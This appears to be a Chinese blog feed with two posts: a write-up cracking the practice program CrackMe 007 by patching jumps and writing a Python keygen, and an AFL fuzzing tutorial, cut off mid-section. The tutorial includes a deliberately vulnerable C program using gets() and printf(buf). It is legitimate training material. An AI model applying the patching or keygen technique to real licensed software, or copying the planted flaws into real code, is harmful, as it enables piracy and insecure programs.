      <url>/posts/7dac.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><ul><li><p><a href="https://github.com/TonyChen56/160-Crackme/tree/master/160%E4%B8%AACrackme007">crackme 007程序下载地址</a></p></li><li><p><a href="https://www.52pojie.cn/thread-1472768-1-1.html">Windows DarkDe4下载安装</a></p></li></ul><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240421234051364.png" alt="image-20240421234051364"></p><p>点击help，可以看到提示：破解目标是使所有的按钮消失，让程序下面的蓝色logo完整显现出来，不允许爆破。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422105549546.png" alt="image-20240422105549546"></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>用Exeinfo PE工具查看该程序，得到信息如下图，可知该程序没有加壳，用Delphi语言编写。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422110526986.png" alt="image-20240422110526986"></p><p>并不需要脱壳处理</p><h2 id="DarkDe查看事件控件"><a href="#DarkDe查看事件控件" class="headerlink" title="DarkDe查看事件控件"></a>DarkDe查看事件控件</h2><p>因为是delphi的程序，先<strong>用Delphi的专用反编译工具DarkDe搜索涉及到的控件和事件函数信息</strong></p><p>事件信息：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422111325644.png" alt="image-20240422111325644"></p><p>控件信息：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422111332284.png" alt="image-20240422111332284"></p><p>可以看到程序有以下几个事件: </p><ul><li>Cancella按钮的点击事件 </li><li>About按钮的点击事件 </li><li>Registerz按钮的点击事件 </li><li>Again按钮的点击事件</li></ul><p>总共四个按钮事件。</p><p>在程序最开始并没有看到Again按钮，猜测为一个隐藏按钮。最开始只有一个Register按钮，因此我们<strong>后续就从Registerz按钮的点击事件开始分析</strong>。</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>将程序拖入ollydbg</p><p>分别在前面发现的事件对应的位置：00442B98，00442F28，004430BC上下断点</p><p>首先在Registerz按钮点击事件的位置 <code>00442F28</code> 下断点</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422113737449.png" alt="image-20240422113737449"></p><p>运行程序，随便输入name &#x3D; 123，Codice &#x3D; 123，F8向下单步执行。</p><p>可以看到这里有两个calll，调用了两个函数，去对应的地址看一下，第一个函数为获取codice，第二个函数检测codice是否为纯数字。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422155744890.png" alt="image-20240422155744890"></p><p>继续单步执行，走到下面的 <code>je</code> 跳转代码后，跳转到了 <code>00442F9D</code> 。</p><p>分析下面的 <code>je</code> 跳转代码，可以知道这里对codice进行了验证，如果codice是纯数字则跳转到 <code>00442F9D</code> 继续执行，如果不是纯数字则会弹窗 <code> &quot;You MUST insert a valid Long Integer Value in the Code Editor... Thank you :)&quot;</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422161158972.png" alt="image-20240422161158972"></p><p>所以正常情况下应该执行  <code>00442F9D</code> ，观察 <code>00442F9D</code> 后的代码，可以看到走到 <code>00442F9F  </code> 又会跳转到 <code>00442FFB</code> ，但是这个跳转处的注释为 “Please… The Code Must be &gt;0”，很明显这是一个异常提示的跳转，所以在这里未发生跳转为程序正常执行</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422161337070.png" alt="image-20240422161337070"></p><p>继续查看未发生跳转部分的汇编代码，可以看到 <code>00442FC0  </code> 处存在第三个跳转到 <code>00442FF2  </code> ，从 <code>00442FF2  </code> 处向下看经过了 <code>00442FFB</code> 处也就是错误提示的字符串，所以在 <code>00442FC0  </code> 处我们不让程序发生跳转，将 je 改为NOP</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422162604439.png" alt="image-20240422162604439"></p><p>F9继续运行程序，可以看到register按钮消失，出现了新的按钮again，直接点击again，可以看到停在了我们前面打的断点 <code>004430BC</code> 处。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422163242089.png" alt="image-20240422163242089"></p><p>向下翻看代码发现和前面的register按钮函数类似，我们执行同样的操作，将找到的位置 <code>00443159</code> 改为NOPs。</p><p>F9继续运行，可以看到已经成功实现了logo的还原，成功爆破。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422163618513.png" alt="image-20240422163618513"></p><h2 id="序号生成算法分析"><a href="#序号生成算法分析" class="headerlink" title="序号生成算法分析"></a>序号生成算法分析</h2><p>根据前面的爆破可以知道，register按钮和again按钮消失的逻辑分别出现在 <code>00442F9F</code> 和 <code>00443159</code> 之后。</p><p>所以首先对register按钮的 <code>00442F9F</code> 进行分析，分析后面的代码可以知道 <code>00442FB9</code> 为算法函数</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422164900113.png" alt="image-20240422164900113"></p><p>crtl + G 跟进到 <code>00442FB9</code> 查看算法函数，可以看到要求用户名要大于4个字符</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422165807004.png" alt="image-20240422165807004"></p><p>在算法后续的计算中涉及到了 eax ，回到前面可以发现在<code>00442FB9</code> 的前面有一个对 eax进行赋值的操作： <code>00442FB4</code>位置对eax进行了赋值，将地址445830的数值赋给了eax。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423143154927.png" alt="image-20240423143154927"></p><p>再检查在什么地方对地址445830进行了赋值，在地址442FB4处[右键]-[查找参考]-[地址常量]，可以查找到程序中所有涉及到这个地址常量的位置。</p><p>可以看到这个地址前面存在一个对445830进行赋值的操作，双击查看</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423145554207.png" alt="image-20240423145554207"></p><p>可以看到，当Codice输入的不全是数字时才对[0x445830] 赋值操作，而所赋的值为 <code>00442F81</code> 处调用函数 <code>00442A8C</code> 的返回值</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423145736385.png" alt="image-20240423145736385"></p><p>对00442A8C进行进一步分析，可以知道对应的[0x445830] 赋值方法</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423150158348.png" alt="image-20240423150158348"></p><p>发现存在逻辑：</p><p>当<strong>第一次输入的密码不为纯数字</strong>的时候，程序会根据密码生成一个值 <code>[0x445830]</code>，后续密码不为纯数字时需要根据这个值来进行运算，所以第一次输入的时候，密码一定要为纯字母，不然无法注册成功。</p><p>接下来进行了两层循环，计算的是用户名的第一位和最后一位的乘积，然后再乘以 <code>[0x445830]</code> 。外层循环变换用户名最后一位，每次往前移动一位。内层循环变换用户名第一位，每次往后移动一位。接着将结果保存到eax。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422170314520.png" alt="image-20240422170314520"></p><ul><li>将eax对 <code>0xA2C2A</code> 取模，记为结果1</li><li>将输入的密码除以 0x59 加上密码mod0x50，结果再加1，记为结果2</li><li>比较结果1和结果2是否相等。相等则返回1，消失按钮。不相等则返回0。</li></ul><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422170812472.png" alt="image-20240422170812472"></p><p>again 按钮的函数算法类似</p><h1 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">szBuff = <span class="built_in">bytearray</span>(<span class="number">30</span>)</span><br><span class="line">CoBuff = <span class="built_in">bytearray</span>(<span class="number">30</span>)</span><br><span class="line">Regcode = <span class="number">0</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">Temp = <span class="number">0x37B</span></span><br><span class="line">Sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CrackeMe007注册机使用说明:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;输入纯字母的codice，关闭报错弹窗后填入计算出的正确codice&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入不少于6位的全字母codice:&quot;</span>)</span><br><span class="line">szBuff = <span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(szBuff) - <span class="number">1</span>):</span><br><span class="line">    Temp = Temp + ((szBuff[i + <span class="number">1</span>] % <span class="number">0x11</span> + <span class="number">1</span>) * szBuff[i])</span><br><span class="line"></span><br><span class="line">Temp = Temp % <span class="number">0x7148</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入用户名:不少于5位的纯数字&quot;</span>)</span><br><span class="line">CoBuff = <span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(CoBuff)):</span><br><span class="line">    Sum = Sum + CoBuff[i]</span><br><span class="line"></span><br><span class="line">Sum = (Sum * Sum * Temp) % <span class="number">0XA2C2A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0X50</span>):</span><br><span class="line">    Regcode = (Sum - i - <span class="number">1</span>) * <span class="number">0X59</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0X50</span>):</span><br><span class="line">        Temp = (Regcode + j) % <span class="number">0X50</span></span><br><span class="line">        <span class="keyword">if</span> Temp == i:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;用户名:%s对应的第%d个可用的注册码：%d&quot;</span> % (CoBuff.decode(<span class="string">&#x27;utf-8&#x27;</span>), a, Regcode + j))</span><br><span class="line">            a = a + <span class="number">1</span></span><br><span class="line">        Temp = <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;Press Enter to exit...&quot;</span>)</span><br><span class="line">sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>随便构造纯数字的name和全字母的codice</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140221413.png" alt="image-20240423140221413"></p><p>产生报错，用上面的注册机生成密码</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140316807.png" alt="image-20240423140316807"></p><p>输入生成的第一个codice，可以看到register按钮消失</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140341510.png" alt="image-20240423140341510"></p><p>再输入前面固定的字符串，点击again按钮</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140629271.png" alt="image-20240423140629271"></p><p>再输入前面注册机得到的codice，成功显现所有的Logo，完成破解</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140701596.png" alt="image-20240423140701596"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://www.cnblogs.com/lonenysky/p/11345362.html">逆向破解之160个CrackMe —— 007</a></li><li><a href="https://blog.csdn.net/M_N_N/article/details/78206825">160个练手CrackMe-007</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『模糊测试』使用AFL进行模糊测试</title>
      <link href="/posts/a48c.html"/>
      <url>/posts/a48c.html</url>
      
        <content type="html"><![CDATA[<h1 id="模糊测试简介"><a href="#模糊测试简介" class="headerlink" title="模糊测试简介"></a>模糊测试简介</h1><p><strong>模糊测试（Fuzzing）</strong>，是一种挖掘软件安全漏洞、检测软件健壮性的黑盒测试方法，是目前软件测试、漏洞挖掘领域的最有效的手段之一，特别适合用于发现0Day漏洞。</p><p>其<strong>主要原理</strong>在于：</p><ul><li>通过随机或是半随机的方式生成大量数据，</li><li>将生成的数据输入给被测试的系统</li><li>检测被测系统的状态，如是否能够响应、响应是否正确等</li><li>根据被测系统的状态判断是否存在潜在的安全漏洞。</li></ul><p>目前比较成功的Fuzzer（执行模糊测试的程序）有AFL、libFuzzer、OSS-Fuzz等。</p><h1 id="AFL简介"><a href="#AFL简介" class="headerlink" title="AFL简介"></a>AFL简介</h1><p>AFL（American Fuzzy Lop）是由安全研究员Michal Zalewski开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240321161056683.png" alt="image-20240321161056683"></p><p>调试人员为程序提供一些输入，即最左侧的testcases，AFL加载后将其放入一个队列中。对于每一次迭代，AFL首先从队列中取出一个testcase，然后对它进行修剪，去除不必要的数据以提高运行效率；再然后对输入进行变异操作，变异的模式很多，可以产生很多新的testcase。对于这些新产生的输入，将它们送到目标程序运行，若能够产生新的执行路径或者导致程序崩溃，就把它再放到队列中。在整个过程中，程序崩溃会被记录下来，它可能代表一个潜藏的漏洞。</p><h2 id="AFL和LibFuzzer的区别"><a href="#AFL和LibFuzzer的区别" class="headerlink" title="AFL和LibFuzzer的区别"></a>AFL和LibFuzzer的区别</h2><p>LibFuzzer和AFL是目前最基本的两个模糊测试工具，而大部分的Fuzzer都是基于AFL和Libfuzzer进行进一步改进实现的，只要将这两个模糊测试工具弄明白，其它工具的安装和部署都是大同小异。</p><p>AFL和LibFuzzer的区别</p><ol><li><strong>集成方式：</strong><ul><li><strong>LibFuzzer：</strong> 通常与源代码直接集成，作为代码的一部分进行编译。它需要目标函数（即被测试的函数）的接口符合特定的格式（接受字节数组和长度作为参数）。</li><li><strong>AFL：</strong> 可以作为一个独立的工具运行，不需要对源代码进行修改。它通过插桩技术来监控程序的执行，以此来引导测试用例的生成。</li></ul></li><li><strong>测试用例生成：</strong><ul><li><strong>LibFuzzer：</strong> 使用基于覆盖率的指导来动态生成测试用例，旨在最大化代码覆盖率。</li><li><strong>AFL：</strong> 同样使用基于覆盖率的方法，但还结合了遗传算法来进化测试用例。</li></ul></li><li><strong>使用场景：</strong><ul><li><strong>LibFuzzer：</strong> 由于需要与源代码直接集成，因此更适合于对特定函数或模块进行深入的单元测试。</li><li><strong>AFL：</strong> 由于可以作为独立工具运行，因此更适合于对整个应用程序进行模糊测试，包括二进制文件。</li></ul></li></ol><p>根据不同的场景，我们可以从AFL和LibFuzzer中做出选择</p><h1 id="AFL的安装"><a href="#AFL的安装" class="headerlink" title="AFL的安装"></a>AFL的安装</h1><p>从 <a src="https://github.com/google/AFL">github项目主页</a> 下载压缩包，解压后进入所在目录。</p><p>执行以下命令进行编译和安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>输入 <code>afl-fuzz</code> 测试是否编译成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240321170854676.png" alt="image-20240321170854676"></p><h1 id="使用AFL进行模糊测试实战"><a href="#使用AFL进行模糊测试实战" class="headerlink" title="使用AFL进行模糊测试实战"></a>使用AFL进行模糊测试实战</h1><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><ol><li><p><strong>确定项目用什么语言编写</strong></p><p>AFL主要用于C&#x2F;C++程序的测试，所以我们先要确定项目是否为C&#x2F;C++编写。（也有一些基于AFL的JAVA Fuzz程序如<a href="https://github.com/isstac/kelinci">kelinci</a>、<a href="https://github.com/Barro/java-afl">java-afl</a>等，但并不知道效果如何）</p><p>如果要批量使用AFL进行模糊测试，如何判断项目的语言：</p><ul><li>项目提供了源代码：使用 <a src="https://github.com/github-linguist/linguist">github-linguist库</a> 进行判断</li><li>项目仅提供二进制文件：</li></ul></li><li><p><strong>是否有示例程序、测试用例</strong></p><ul><li><p>如果目标有现成的示例程序，特别是一些开源的库，可以方便我们直接用示例程序调用该库，不用自己再写一个程序</p></li><li><p>如果目标已经提供测试用例，那后面构建语料库时也省事儿一点</p></li></ul></li><li><p><strong>项目规模</strong></p><p>某些程序规模很大，会被分为好几个模块，为了提高Fuzz效率，在Fuzzing前，需要定义Fuzzing部分。这里推荐一下源码阅读工具Understand，它 <code>treemap</code> 功能，可以直观地看到项目结构和规模。比如下面ImageMagick的源码中，灰框代表一个文件夹，蓝色方块代表了一个文件，其大小和颜色分别反映了行数和文件复杂度。</p></li></ol><h2 id="构建语料库"><a href="#构建语料库" class="headerlink" title="构建语料库"></a>构建语料库</h2><p>AFL需要一些初始输入数据（即种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。</p><h2 id="标准模式——有源码fuzz"><a href="#标准模式——有源码fuzz" class="headerlink" title="标准模式——有源码fuzz"></a>标准模式——有源码fuzz</h2><h3 id="编译插桩"><a href="#编译插桩" class="headerlink" title="编译插桩"></a>编译插桩</h3><p>首先我们可以自行用编写一个有漏洞的C语言程序 afl_test.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">AFLTest</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为16，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    AFLTest(buf);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对该源文件进行编译插桩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc afl_test.c -o afl_test</span><br></pre></td></tr></table></figure><blockquote><p>如果编译一个c++的源码，使用afl-g++。</p></blockquote><p>现实情况下，我们往往需要对一整个项目而不是单个的C&#x2F;C++文件进行fuzz，所以需要指定afl-gcc&#x2F;afl-g++对整个项目进行编译插桩</p><blockquote><p>命令的具体含义与作用可以参考文章xx的 <code>linux下软件的发布与安装</code> 部分内容</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure CC=<span class="string">&quot;afl-gcc&quot;</span> CXX=<span class="string">&quot;afl-g++&quot;</span> --disable-shared <span class="comment"># 指定C和C++的编译器为afl所提供的编译插桩工具</span></span><br><span class="line">make <span class="comment"># 然后再进行编译</span></span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>编译后的结果如下图，可以看到对我们留下的漏洞产生了warning，不用理会</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240322154357305.png" alt="image-20240322154357305"></p><h3 id="建立输入和输出文件夹"><a href="#建立输入和输出文件夹" class="headerlink" title="建立输入和输出文件夹"></a>建立输入和输出文件夹</h3><p>一般的程序接收的输入为标准输入流stdin类型或者文件类型</p><blockquote><p>stdin指的是从标准输入流（stdin，标准输入设备）中获取输入数据。</p><p>stdin通常用于从终端（命令行）或其他程序中读取输入。这种方式可以让程序<strong>接受用户的交互式输入或从其他程序输出中获取数据</strong>，而<strong>无需直接依赖于文件或其他输入源</strong>。</p></blockquote><p>对于我们这个文件afl_test.c，可以知道接收的输入类型为stdin标准输入流</p><p>建立两个文件夹：fuzz_in和fuzz_out，用来存放程序的输入和fuzz的输出结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> fuzz_in</span><br><span class="line"><span class="built_in">mkdir</span> fuzz_out</span><br></pre></td></tr></table></figure><p>在fuzz_in文件夹下构建初始测试用例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> fuzz_in</span><br><span class="line">vim testcase</span><br></pre></td></tr></table></figure><p>在testcae文件中写入程序的输入数据，这里也可以随意输入一点文本，作为起始种子。（因为afl会根据初始种子自动变异生成更多的测试样例，所以初始种子可以随意一点）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;asdsas&quot;</span> &gt;&gt; testcase</span><br></pre></td></tr></table></figure><blockquote><p><code>afl-fuzz</code>会将<code>testcase</code>文件中的内容作为输入，通过标准输入流（stdin）传递给目标程序。</p><p>所以这里是基于stdin而并不是文件</p></blockquote><h3 id="使用-afl-fuzz-工具执行fuzz测试"><a href="#使用-afl-fuzz-工具执行fuzz测试" class="headerlink" title="使用 afl-fuzz 工具执行fuzz测试"></a>使用 afl-fuzz 工具执行fuzz测试</h3><p>针对程序不同的输入类型：</p><ul><li><p>从stdin读取输入的目标程序，fuzz命令语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br></pre></td></tr></table></figure><ul><li><code>-i</code>：指定测试用例所在的目录，表示从该目录中读取输入数据。</li><li><code>-o</code>：指定fuzz结果输出的目录</li><li><code>/path/to/program</code>：表示目标程序的路径</li><li><code>[...params...]</code>：表示其他可能的参数。</li></ul></li><li><p>从文件读取输入的目标程序来说，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure></li></ul><p>使用如下命令执行fuzz：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i fuzz_in -o fuzz_out ./easy_test</span><br></pre></td></tr></table></figure><p>经过一个半小时的fuzz，总共找到了4条执行路径（对应前面的程序代码），8个crash。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326111143917.png" alt="image-20240326111143917"></p><h3 id="结束fuzz"><a href="#结束fuzz" class="headerlink" title="结束fuzz"></a>结束fuzz</h3><p>afl-fuzz永远不会停止，所以何时停止测试很多时候就是依靠afl-fuzz提供的状态来决定的。具体的几种方式如下所示:</p><ul><li>状态窗口的<code>cycles done</code>变为绿色;</li><li><code>afl-whatsup</code>查看afl-fuzz状态;</li><li><code>afl-stat</code>得到类似于afl-whatsup的输出结果;</li><li>定制 <code>afl-whatsup</code> -&gt;在所有代码外面加个循环就好;</li><li>用 <code>afl-plot</code> 绘制各种状态指标的直观变化趋势;</li><li><code>pythia</code>估算发现新crash和path概率。</li></ul><h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><h4 id="fuzz界面分析"><a href="#fuzz界面分析" class="headerlink" title="fuzz界面分析"></a>fuzz界面分析</h4><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326111143917.png" alt="image-20240326111143917"></p><p>根据上面的fuzz界面图：</p><ol><li><p><strong>process timing</strong>:</p><ul><li><p><strong><code>last new path</code></strong> : 表示自从最后一个新路径被发现以来经过的时间。这可以帮助你了解新路径发现的频率。</p><blockquote><p>如果这个字段产生了报错，如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240329171431783.png" alt="image-20240329171431783"></p><p>可能是因为：</p><ol><li><strong>语法错误</strong>：检查你的测试用例和目标程序，确保它们的语法正确。</li><li><strong>测试用例不足</strong>：如果你提供的初始测试用例过于简单或不足以触发新的路径，AFL 可能无法有效地探索目标程序的状态空间。</li><li><strong>代码覆盖率低</strong>：目标程序的某些部分可能难以触及，导致 AFL 无法发现新的路径。</li><li><strong>目标程序简单</strong>：如果目标程序非常简单，可能只有很少的执行路径，因此 AFL 无法发现新的路径。</li><li><strong>配置问题</strong>：检查 AFL 的配置设置，确保它们适合你的测试目标和环境。</li></ol><p>接下来要及时修正，不然继续fuzz也是徒劳（因为路径是不会改变的），可以采取以下解决方案：</p><ul><li><strong>增加测试用例</strong>：提供更多或更复杂的初始测试用例，以帮助 AFL 探索新的路径。</li><li><strong>调整 AFL 设置</strong>：调整 AFL 的参数和设置，例如增加变异率或改变变异策略，以尝试发现新的路径。</li><li><strong>优化目标程序</strong>：如果可能，修改目标程序以增加可触及的代码路径。</li><li><strong>增加测试时间</strong>：延长测试的时间，给 AFL 更多的机会发现新的路径。</li><li><strong>检查目标程序</strong>：确保目标程序没有错误，且适合模糊测试。</li></ul></blockquote></li><li><p><code>last uniq 